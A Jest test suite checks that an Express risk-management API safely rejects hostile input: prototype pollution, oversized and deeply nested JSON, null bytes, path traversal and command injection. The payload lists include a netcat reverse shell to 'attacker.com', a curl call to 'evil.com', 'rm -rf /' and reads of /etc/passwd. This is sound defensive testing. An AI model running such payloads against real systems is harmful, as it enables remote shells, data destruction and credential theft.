/**
 * Input Validation Security Contract Tests
 *
 * Tests for dangerous input patterns including:
 *   - Prototype pollution
 *   - Oversized payloads
 *   - Null bytes
 *   - Path traversal
 *   - Command injection
 */

import { jest, describe, it, expect, beforeEach } from '@jest/globals';
import request from 'supertest';
import express from 'express';
import jwt from 'jsonwebtoken';
import { prismaMock, createMockRiskItem } from '../mocks/prisma';

// ---------------------------------------------------------------------------
// Mocks
// ---------------------------------------------------------------------------

jest.mock('../../config/database', () => ({
  __esModule: true,
  default: prismaMock,
}));

jest.mock('../../config/logger', () => ({
  __esModule: true,
  default: { info: jest.fn(), error: jest.fn(), warn: jest.fn(), debug: jest.fn() },
}));

jest.mock('../../utils/auditLogger', () => ({
  AuditLogger: { log: jest.fn() },
}));

jest.mock('../../utils/securityEventLogger', () => ({
  logSecurityEvent: jest.fn(),
  SecurityEventType: {
    AUTHENTICATION_FAILURE: 'AUTHENTICATION_FAILURE',
    AUTHORIZATION_FAILURE: 'AUTHORIZATION_FAILURE',
    RATE_LIMIT_EXCEEDED: 'RATE_LIMIT_EXCEEDED',
    TOKEN_REVOKED: 'TOKEN_REVOKED',
    INJECTION_ATTEMPT: 'INJECTION_ATTEMPT',
    SUSPICIOUS_INPUT: 'SUSPICIOUS_INPUT',
  },
}));

jest.mock('../../config/monitoring', () => ({
  __esModule: true,
  default: { setUserContext: jest.fn(), captureException: jest.fn() },
}));

jest.mock('../../services/tokenBlacklistService', () => ({
  __esModule: true,
  default: {
    isRevoked: jest.fn().mockResolvedValue(false),
    isRevokedByUserReset: jest.fn().mockResolvedValue(false),
  },
}));

jest.mock('../../config', () => ({
  __esModule: true,
  default: {
    server: { env: 'production', port: 3001, apiUrl: '', clientUrl: '' },
    jwt: {
      secret: 'input-val-test-secret',
      expiresIn: '1h',
      refreshSecret: 'refresh-secret',
      refreshExpiresIn: '7d',
    },
    security: { rateLimitWindowMs: 60000, rateLimitMaxRequests: 1000 },
  },
}));

jest.mock('../../middleware/auth', () => ({
  authenticate: (req: any, res: any, next: any) => {
    if ((req as any).user) return next();
    res.status(401).json({ error: 'No token provided' });
  },
  authorize:
    (..._roles: string[]) =>
    (req: any, res: any, next: any) => {
      if (!(req as any).user) return res.status(401).json({ error: 'Auth required' });
      next();
    },
  AuthRequest: {},
}));

jest.mock('../../services/geminiService', () => ({
  __esModule: true,
  default: {
    prioritizeRisks: jest.fn().mockResolvedValue([]),
    generateRemediationPlan: jest.fn().mockResolvedValue('plan'),
  },
}));

jest.mock('uuid', () => ({
  v4: jest.fn().mockReturnValue('mock-uuid-1234'),
}));

jest.mock('../../generated/prisma/client', () => ({
  ComplianceStatus: {
    Compliant: 'Compliant',
    At_Risk: 'At_Risk',
    Non_Compliant: 'Non_Compliant',
    In_Review: 'In_Review',
  },
}));

// ---------------------------------------------------------------------------
// App
// ---------------------------------------------------------------------------

import risksRoutes from '../../routes/risks';
import { errorHandler } from '../../middleware/errorHandler';

const JWT_SECRET = 'input-val-test-secret';

const app = express();
app.use(express.json({ limit: '1mb' }));

app.use((req, _res, next): void => {
  const authHeader = req.headers.authorization;
  if (authHeader && authHeader.startsWith('Bearer ')) {
    try {
      const token = authHeader.split(' ')[1];
      const decoded = jwt.verify(token, JWT_SECRET) as Record<string, unknown>;
      (req as any).user = decoded;
    } catch {
      // no-op
    }
  }
  next();
});

app.use('/api/risks', risksRoutes);
app.use(errorHandler);

const generateToken = () =>
  jwt.sign(
    { id: 'user-123', organizationId: 'org-123', role: 'Admin', email: 'test@example.com', name: 'Test' },
    JWT_SECRET,
    { expiresIn: '1h' },
  );

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('Input Validation Security Contract Tests', () => {
  const authToken = generateToken();

  beforeEach(() => {
    jest.clearAllMocks();
  });

  // =========================================================================
  // Prototype Pollution
  // =========================================================================
  describe('Prototype Pollution', () => {
    const pollutionPayloads = [
      { __proto__: { isAdmin: true } },
      { constructor: { prototype: { isAdmin: true } } },
      { '__proto__.isAdmin': true },
      { 'constructor.prototype.isAdmin': true },
    ];

    it.each(pollutionPayloads)(
      'should not allow prototype pollution via POST body',
      async (payload) => {
        prismaMock.riskItem.create.mockResolvedValue(createMockRiskItem());

        const res = await request(app)
          .post('/api/risks')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            title: 'Test Risk',
            description: 'Desc',
            category: 'Security',
            severity: 'High',
            likelihood: 3,
            impact: 3,
            ...payload,
          });

        // Should either reject or safely ignore dangerous keys
        expect([200, 201, 400, 422]).toContain(res.status);

        // Verify Object.prototype was not polluted
        expect(({} as any).isAdmin).toBeUndefined();
      },
    );

    it('should not pollute via query parameters', async () => {
      prismaMock.riskItem.findMany.mockResolvedValue([]);

      const res = await request(app)
        .get('/api/risks?__proto__[isAdmin]=true&constructor[prototype][isAdmin]=true')
        .set('Authorization', `Bearer ${authToken}`);

      expect(({} as any).isAdmin).toBeUndefined();
      expect([200, 400]).toContain(res.status);
    });
  });

  // =========================================================================
  // Oversized Payloads
  // =========================================================================
  describe('Oversized Payloads', () => {
    it('should reject payloads exceeding the body limit (>1MB)', async () => {
      const hugeString = 'A'.repeat(2 * 1024 * 1024);

      const res = await request(app)
        .post('/api/risks')
        .set('Authorization', `Bearer ${authToken}`)
        .set('Content-Type', 'application/json')
        .send(JSON.stringify({ title: hugeString }));

      // 413 if body-parser rejects, 400 if validation catches it, 500 if error handler wraps it
      expect([400, 413, 500]).toContain(res.status);
    });

    it('should reject deeply nested JSON objects', async () => {
      // Create 200-level deep nesting
      let nested: any = { value: 'deep' };
      for (let i = 0; i < 200; i++) {
        nested = { nested };
      }

      const res = await request(app)
        .post('/api/risks')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          title: 'Deep nest test',
          description: 'test',
          category: 'Security',
          severity: 'High',
          likelihood: 3,
          impact: 3,
          metadata: nested,
        });

      // Should not crash the server — any non-500 is acceptable
      expect(res.status).not.toBe(500);
    });

    it('should reject extremely long string fields', async () => {
      const longTitle = 'x'.repeat(100_000);

      const res = await request(app)
        .post('/api/risks')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          title: longTitle,
          description: 'test',
          category: 'Security',
          severity: 'High',
          likelihood: 3,
          impact: 3,
        });

      // Should be rejected by validation or handled gracefully
      expect([200, 201, 400, 422]).toContain(res.status);
    });
  });

  // =========================================================================
  // Null Bytes
  // =========================================================================
  describe('Null Byte Injection', () => {
    const nullBytePayloads = [
      'test\x00malicious',
      'filename.txt\x00.exe',
      'normal\u0000hidden',
      '\x00',
    ];

    it.each(nullBytePayloads)(
      'should safely handle null byte in string fields: %s',
      async (payload) => {
        prismaMock.riskItem.create.mockResolvedValue(createMockRiskItem());

        const res = await request(app)
          .post('/api/risks')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            title: payload,
            description: 'test',
            category: 'Security',
            severity: 'High',
            likelihood: 3,
            impact: 3,
          });

        // Should not cause server error
        expect(res.status).not.toBe(500);
      },
    );

    it('should handle null bytes in query parameters', async () => {
      prismaMock.riskItem.findMany.mockResolvedValue([]);

      const res = await request(app)
        .get('/api/risks?search=test%00admin')
        .set('Authorization', `Bearer ${authToken}`);

      expect([200, 400]).toContain(res.status);
    });
  });

  // =========================================================================
  // Path Traversal
  // =========================================================================
  describe('Path Traversal', () => {
    const traversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '/etc/passwd',
    ];

    it.each(traversalPayloads)(
      'should safely handle path traversal payload in ID: %s',
      async (payload) => {
        prismaMock.riskItem.findFirst.mockResolvedValue(null);

        const res = await request(app)
          .get(`/api/risks/${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${authToken}`);

        // Should not return file system content
        expect([400, 404]).toContain(res.status);
        const body = JSON.stringify(res.body);
        expect(body).not.toContain('root:');
        expect(body).not.toContain('/bin/bash');
      },
    );

    it.each(traversalPayloads)(
      'should safely handle path traversal in body fields: %s',
      async (payload) => {
        prismaMock.riskItem.create.mockResolvedValue(createMockRiskItem());

        const res = await request(app)
          .post('/api/risks')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            title: payload,
            description: payload,
            category: 'Security',
            severity: 'High',
            likelihood: 3,
            impact: 3,
          });

        expect(res.status).not.toBe(500);
      },
    );
  });

  // =========================================================================
  // Command Injection
  // =========================================================================
  describe('Command Injection', () => {
    const commandPayloads = [
      '; cat /etc/passwd',
      '| ls -la',
      '$(whoami)',
      '`id`',
      '&& curl http://evil.com',
      '; rm -rf /',
      '| nc -e /bin/sh attacker.com 4444',
      "'; exec('rm -rf /'); //",
    ];

    it.each(commandPayloads)(
      'should safely handle command injection payload: %s',
      async (payload) => {
        prismaMock.riskItem.create.mockResolvedValue(createMockRiskItem());

        const res = await request(app)
          .post('/api/risks')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            title: payload,
            description: 'test',
            category: 'Security',
            severity: 'High',
            likelihood: 3,
            impact: 3,
          });

        // Should not execute commands — expect normal response or validation error
        expect(res.status).not.toBe(500);
        const body = JSON.stringify(res.body);
        expect(body).not.toContain('root:x:0:0');
        expect(body).not.toMatch(/uid=\d+/);
      },
    );

    it('should safely handle command injection in URL parameters', async () => {
      prismaMock.riskItem.findFirst.mockResolvedValue(null);

      const res = await request(app)
        .get('/api/risks/;cat%20/etc/passwd')
        .set('Authorization', `Bearer ${authToken}`);

      expect([400, 404]).toContain(res.status);
    });
  });

  // =========================================================================
  // Content-Type Enforcement
  // =========================================================================
  describe('Content-Type Enforcement', () => {
    it('should reject non-JSON content type on POST', async () => {
      const res = await request(app)
        .post('/api/risks')
        .set('Authorization', `Bearer ${authToken}`)
        .set('Content-Type', 'text/plain')
        .send('title=Hacked&description=evil');

      // Should either reject (400/415/422) or error (500) — non-JSON bodies may not be parsed
      expect([400, 415, 422, 500]).toContain(res.status);
    });

    it('should handle XML content type safely', async () => {
      const res = await request(app)
        .post('/api/risks')
        .set('Authorization', `Bearer ${authToken}`)
        .set('Content-Type', 'application/xml')
        .send('<risk><title>XXE Test</title></risk>');

      // Should not process XML — reject, ignore, or error
      expect([400, 415, 422, 500]).toContain(res.status);
    });
  });

  // =========================================================================
  // Special Characters
  // =========================================================================
  describe('Special Characters', () => {
    const specialCharPayloads = [
      '🎉💀🔥',
      '™®©',
      '\t\n\r',
      String.fromCharCode(0x200B), // zero-width space
      '\uFEFF', // BOM
      '𝕳𝖊𝖑𝖑𝖔', // Mathematical script
    ];

    it.each(specialCharPayloads)(
      'should handle special characters without crashing: %s',
      async (payload) => {
        prismaMock.riskItem.create.mockResolvedValue(createMockRiskItem());

        const res = await request(app)
          .post('/api/risks')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            title: payload,
            description: 'test',
            category: 'Security',
            severity: 'High',
            likelihood: 3,
            impact: 3,
          });

        // Should handle gracefully — no 500
        expect(res.status).not.toBe(500);
      },
    );
  });
});
